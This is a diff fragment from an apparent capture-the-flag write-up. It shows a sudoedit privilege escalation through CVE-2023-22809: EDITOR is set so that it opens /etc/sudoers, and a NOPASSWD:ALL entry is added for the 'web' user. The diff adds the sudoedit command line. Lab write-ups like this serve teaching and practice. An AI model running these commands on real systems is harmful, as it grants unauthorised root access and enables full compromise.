@@ -85,6 +85,7 @@ after some googling it could be vulnerable to [CVE-2023-22809](https://www.synac
 after understanding how it works what I did was like this:
 ```bash
 export EDITOR="vim -- /etc/sudoers"
+sudoedit /etc/nginx/site-available/admin.cyberusbank.thm
 web ALL=(ALL:ALL) NOPASSWD:ALL # added this in the sudors file
 ```
 then saved the changes. If we typed sudo -l we can see that the sudeors file is updated
